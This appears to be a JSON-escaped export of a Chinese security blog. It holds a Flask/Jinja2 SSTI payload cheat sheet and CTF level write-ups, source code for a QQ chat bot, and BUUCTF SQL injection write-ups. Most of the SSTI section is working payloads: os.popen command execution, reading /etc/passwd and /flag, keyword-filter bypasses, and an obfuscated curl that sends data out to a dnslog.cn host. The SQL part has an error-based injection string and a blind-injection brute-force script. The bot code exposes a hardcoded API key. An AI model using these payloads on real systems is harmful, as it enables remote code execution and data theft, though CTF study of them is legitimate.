内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()\n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          应用上下文，一个全局变量\nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t get传参\nrequest.values.x1 \t 所有参数\nrequest.cookies      cookies参数\nrequest.headers      请求头参数\nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\nrequest.data  \t\t post传参\t(Content-Type:a/b)\nrequest.json\t\t post传json  (Content-Type: application/json)\nconfig               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### 代码块\n\n```\n变量块 {{}}\t用于将表达式打印到模板输出\n注释块 {##}\t注释\n控制块\t{%%}\t可以声明变量，也可以执行语句\n行声明\t##\t\t可以有和{%%}相同的效果\n```\n\n### 常用的过滤器\n\n```\nint()：将值转换为int类型；\nfloat()：将值转换为float类型；\nlower()：将字符串转换为小写；\nupper()：将字符串转换为大写；\ntitle()：把值中的每个单词的首字母都转成大写；\ncapitalize()：把变量值的首字母转成大写，其余字母转小写；\ntrim()：截取字符串前面和后面的空白字符；\nwordcount()：计算一个长字符串中单词的个数；\nreverse()：字符串反转；\nreplace(value,old,new)： 替换将old替换为new的字符串；\ntruncate(value,length=255,killwords=False)：截取length长度的字符串；\nstriptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；\nescape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。\nsafe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；\nlist()：将变量列成列表；\nstring()：将变量转换成字符串；\njoin()：将一个序列中的参数值拼接成字符串。示例看上面payload；\nabs()：返回一个数值的绝对值；\nfirst()：返回一个序列的第一个元素；\nlast()：返回一个序列的最后一个元素；\nformat(value,arags,*kwargs)：格式化字符串。比如：{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo!\nlength()：返回一个序列或者字典的长度；\nsum()：返回列表内数值的和；\nsort()：返回排序后的列表；\ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\nlength()返回字符串的长度，别名是count\n```\n\n### **Flask的一些全局变量 && 关键字**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### 常用payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//想要获取命令执行结果可以在后面加上.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\n其中的xxxx可以为任意字符\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #本地测试不知道为什么执行whoami只会返回None\n\n```\n\n[拓展](https://dar1in9s.github.io/2020/09/15/ssti进阶/)\n\n### 16进制绕过\n\n可使用16进制绕过关键字符\n\n```\n\\x5f _\n```\n\n寻找可用类脚本\n\n```python\nimport json\n\na = \"\"\"\n\"\"\"\n\nnum = 0\nallList = []\n\nresult = \"\"\nfor i in a:\n    if i == \">\":\n        result += i\n        allList.append(result)\n        result = \"\"\n    elif i == \"\\n\" or i == \",\":\n        continue\n    else:\n        result += i\n\nfor k, v in enumerate(allList):\n    if \"os._wrap_close\" in v:\n        print(str(k) + \"--->\" + v)\n```\n\n#### [除了python之外的SSTI](https://www.cnblogs.com/bmjoker/p/13508538.html)\n\n\n\n\n\n\n\n**361**\n\n无过滤，参数名为name，直接执行命令即可\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**362**\n\n过滤了数字，使用全角数字代替正常数字\n\n```\npayload:?name={{\"\".__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('tac /flag').read()}}\n```\n\n**363**\n\n过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过\n\n```\n//request.args\npayload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**364**\n\n过滤了args，无法使用GET传参了，使用~~POST（方法被禁用了）~~或者cookie都可\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}\nCookie: a=os;b=popen;c=tac /flag;\n```\n\n```\n//chr\npayload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}\n```\n\n**365**\n\n过滤了中括号，换点\n\n```\n//cookie\npayload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}\nCookie: a=tac /flag\n```\n\n**366**\n\n过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;\n```\n\n他人WP\n\n```\npayload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}\nCookie: a=__globals__;b=cat /flag;\n```\n\n**367**\n\n过滤了os，继续用attr\n\n```\npayload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**368**\n\n过滤了{undefined{undefined，使用命令方式print\n\n```\npayload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}\nCookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;\n```\n\n**369**\n\n过滤了request，没办法传递参量了，使用模版过滤器\n\n```\npayload:?name={% set po=dict(po=a,p=a)|join%}//构造pop，为下方提供_\n{% set a=(()|select|string|list)|attr(po)(24)%}//构造出_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//构造出__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//构造出__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//构造出__getitem__\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//构造出__builtins__\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//构造出builtins模块\n{% set chr=x.chr%}//使用chr函数\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//构造出字符串/flag\n{%print(x.open(file).read())%}//读文件\n```\n\n**370**\n\n过滤数字用全角，或者使用length，count构造数字\n\n```\npayload:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(２４)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}\n{%print(x.open(file).read())%}\n```\n\n**371**\n\nprint回显被禁，dnslog外带\n\n```\n?name={%set po=(dict(po=a,p=a)|join)%}\n{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}\n{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}\n{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}\n{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}\n{% set ous=(dict(o=a,s=a)|join)%}\n{% set ouuu=(ur|attr(glo)|attr(ous))%}\n```\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n**372**\n\ncount换成length\n\n```\n?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}\n```\n\n","tags":["CTF","web","SSTI"]},{"title":"罗伯特","url":"/posts/61106.html","content":"\n```python\n#bot.py\nfrom unittest.mock import NonCallableMagicMock\nfrom flask import Flask, request\nimport requests\nimport api\napp = Flask(__name__)\n\n'''监听端口，获取QQ信息'''\n@app.route('/', methods=[\"POST\"])\ndef post_data():\n    '下面的request.get_json().get......是用来获取关键字的值用的，关键字参考上面代码段的数据格式'\n    if request.get_json().get('message_type')=='private':\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        api.keywordForPerson(message,uid)\n    if request.get_json().get('message_type')=='group':\n        gid = request.get_json().get('group_id')\n        uid = request.get_json().get('sender').get('user_id')\n        message = request.get_json().get('raw_message')\n        nick=request.get_json().get('sender').get('nickname')\n        role=request.get_json().get('sender').get('role')\n        api.keywordForGroup(message, gid, uid,nick,role)\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(debug=True, host='127.0.0.1', port=5701)\n\n```\n\n```python\n#api.py\nimport person\nimport group\nimport requests\nimport re\nimport time\nimport json\nimport random\n\n\n\ndef help():\n    return \"天气：输入天气 地名，获取当地天气，默认为徐州天气\\n双色球：输入双色球查看最新一期双色球开奖信息以及奖池累计金额\\n扔瓶子：私聊罗伯特并发送以下内容：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\\n来扔瓶子\\n捞瓶子：发送捞瓶子来捞别人扔的瓶子\\n帮助：输入/help，获取帮助\"\ndef weather(message):\n    try:\n        city=message.split(' ')[1]\n    except:\n        city='徐州'\n    try:\n        ercode=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city,timeout=1).text\n    except:\n        return \"罗伯特被学校关起来了呜呜\"\n    if \"invilad-citykey\" in ercode:\n        return \"抱歉，您的输入有误，请检查后再试\"\n    weatherInfo=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['forecast'][0]\n    ganmao=requests.get(url='http://wthrcdn.etouch.cn/weather_mini?city='+city).json()['data']['ganmao']\n    fl=re.search(r\"[0-9]+\",weatherInfo['fengli']).group(0)\n    hi=re.search(r\"[0-9]+\",weatherInfo['high']).group(0)\n    lo=re.search(r\"[0-9]+\",weatherInfo['low']).group(0)\n    weatherInfo=f\"今日{city}天气{weatherInfo['type']}，最高温度{hi}℃，最低温度{lo}℃，{weatherInfo['fengxiang']}{fl}级\\n温馨提示，{ganmao}\"\n    return weatherInfo\ndef buquan(message,uid):\n    #计算括号数量并自动补全\n    def countBracket(message):\n        countban=0\n        for i in message:\n            if i=='(':\n                countban+=1\n            if i==')':\n                countban-=1\n        countquan=0\n        for i in message:\n            if i=='（':\n                countquan+=1\n            if i=='）':\n                countquan-=1\n        return {'ban':countban,'quan':countquan}\n    #自动补全括号\n    ban=countBracket(message)['ban']\n    quan=countBracket(message)['quan']\n    bu=\"\"\n    if not (ban or quan):\n        return\n    if ban>0:\n        for i in range(ban):\n            bu+=')'\n    elif ban<0:\n        for i in range(-ban):\n            bu+='('\n    if quan>0:\n        for i in range(quan):\n            bu+='）'\n    elif quan<0:\n        for i in range(-quan):\n            bu+='（'\n    print(bu+f\"[CQ:at,qq={uid}]帮你补括号\")\n    return bu+f\"[CQ:at,qq={uid}]帮你补括号\"\ndef theDoubleChromosphere(uid):\n    tex=requests.get(\"http://www.cwl.gov.cn/fcpz/yxjs/ssq/\").text\n    #获取红球\n    red=re.search(r\"<div class=\\\"ssqRed-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    red=red.split(',')\n    #获取蓝球\n    blue=re.search(r\"<div class=\\\"ssqBlue-dom\\\">\\[(.*?)\\]</div>\",tex).group(1)\n    blue=blue.split(',')\n    #获取期号\n    qh=re.search(r\"<div class=\\\"ssqQh-dom\\\">(.*?)</div>\",tex).group(1)\n    #获取奖池\n    pool=re.search(r\"<div class=\\\"ssqPool-dom\\\">(.*?)</div>\",tex).group(1)\n    return f\"第{qh}期开奖结果为：\\n红球：{red}\\n蓝球：{blue}\\n奖池：{pool}\\n[CQ:at,qq={uid}]害搁着等着干啥呢，赶紧买彩票去啊\"\ndef sign(gid,uid,nick):\n    today=time.strftime(\"%Y-%m-%d\",time.localtime())\n    groupUserInfo=group.readGroupUserInfo()\n    try:\n        thisGroupUserInfo=groupUserInfo[str(gid)]\n    except:\n        thisGroupUserInfo={}\n        thisGroupUserInfo[str(uid)]={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": nick, \"point\": 0, \"signTime\": \"\", \"ban\": False}\n        thisGroupUserInfo[str(uid)]=thisUser\n    if thisUser['signTime']==today:\n        return f\"[CQ:at,qq={uid}]您今天已经签到过了，明天再来吧\"\n    else:\n        thisUser['point']+=1\n        thisUser['signTime']=today\n        group.saveGroupUserInfo(groupUserInfo)\n        return f\"[CQ:at,qq={uid}]签到成功，您的积分为{thisUser['point']}，明天再来吧\"\ndef getQQ(message):\n    try:\n        qq=re.search(r\"qq=(\\d+)\",message).group(1)\n    except:\n        qq=None\n    return qq\ndef ban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=True\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好，我们不和[CQ:at,qq={uid}]玩\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好吧，我原谅你了[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='天气':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]您的积分为{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"没问题，以后我就听你的啦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"请输入运势 星座来查询今日运势\"\n    if len(message)==2:\n        message=message+\"座\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}今日运势：\\n综合指数：{ys['all']}%\\n幸运色：{ys['color']}\\n健康指数：{ys['health']}%\\n爱情指数：{ys['love']}%\\n财运指数：{ys['money']}%\\n工作指数：{ys['work']}%\\n幸运数字：{ys['number']}\\n适配星座：{ys['QFriend']}\\n总结：{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]您的积分不足\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            json.dump(bottle,f)\n        return f\"biu～～～瓶子被扔走啦，坐等被人打捞吧～～～\"\n    except:\n        return \"扔瓶子失败了，请检查内容格式是否为：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}扔给了{nb['rec']}一个瓶子，内容是：{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"您还没有瓶子呢，快去捞瓶子吧～～～\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}扔给了{i['rec']}一个瓶子，内容是：{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]您的瓶子有：\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有瓶子呢，快去捞瓶子吧～～～\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]您摔碎了{nb['send']}扔给{nb['rec']}一个瓶子，内容是：{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有这个瓶子，快去捞一个吧\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='天气':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='运势':\n        group.sendMessage(today(message),gid)\n    elif message==\"积分\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"听他的话\" and uid==405454586:\n        group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='双色球':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"签到\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"捞瓶子\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"我的瓶子\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"摔瓶子\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"无内鬼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]穿件衣服吧你！你自己不恶sin吗？\",gid)\n    if re.search(r\"[\\(\\)（）]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"扔瓶子\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#保存用户信息\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#读取用户信息\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#发送信息\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"BUUCTF记录1","url":"/posts/42117.html","content":"\n## [极客大挑战 2019]HardSQL\n\n首先尝试输入点东西\n\n结果![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.07.png)\n\n尝试万能密码![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.34.png)\n\n跑一下看看都过滤了啥\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: by\n该字符是非法字符: if\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: mid\n该字符是非法字符: substring\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: insert\n该字符是非法字符: *\n该字符是非法字符: =\n该字符是非法字符: \\\n该字符是非法字符: 空格\n```\n\n只能尝试报错注入了\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\n报错注入限制长度，用right函数切割\n\n\n\n\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n布尔盲注\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## 